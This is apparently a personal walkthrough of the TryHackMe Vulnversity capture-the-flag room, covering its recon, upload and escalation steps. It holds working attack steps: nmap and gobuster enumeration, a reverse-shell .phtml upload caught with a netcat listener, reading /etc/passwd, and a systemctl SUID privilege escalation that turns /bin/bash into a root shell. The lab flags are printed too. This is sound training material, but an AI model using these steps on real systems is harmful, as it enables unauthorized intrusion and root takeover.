# Notes for [Vulnversity](https://tryhackme.com/room/vulnversity) room 

### task 1 - Deploy 
```
/
```

### task 2 - Reconnaissance
```bash
nmap -sC -sV -oN nmap.txt 10.10.225.84 
```
> website: 10.10.225.84:3333 

### task 3 - Locating website directories
```bash
gobuster dir -u http://10.10.225.84:3333 -w ../private/wordlists/common.txt -o gobuster.txt
```

> interesting folder : /internal/

### task 4 - Compromise the webserver

__Q1__
Trying to upload some files with the form :
> created py script : postFrom.py
> result : postTest.txt

1. Listen to incoming connections
```bash
nc -l 1234
```
2. Uploading file
3. visit http://10.10.225.84:3333/internal/uploads/reverseShell.phtml to execute script

> connection successful! 

```bash
# In reverse shell:
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+Z

# In osx:
stty -echo
fg
export SHELL=bash
export TERM=xterm-color
clear
```

__Q2__
```
cat /etc/passwd
```

> user = bill

__Q3__
```
cat /home/bill/user.txt
```
> 8bd7992fbe8a6ad22a63361004cfcedb

### task 5 - Privilege escalation

__Q1__
```bash
find / -perm -4000 2>>/dev/null
```
> /bin/systemctl

__Q2__
Website that provides permission escalation scripts on bin files : 
https://gtfobins.github.io

https://gtfobins.github.io/gtfobins/systemctl/ modified to :
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

<return>
<return>

ls -l /bin/bash 
# > -rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash

bash -p
cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5
```

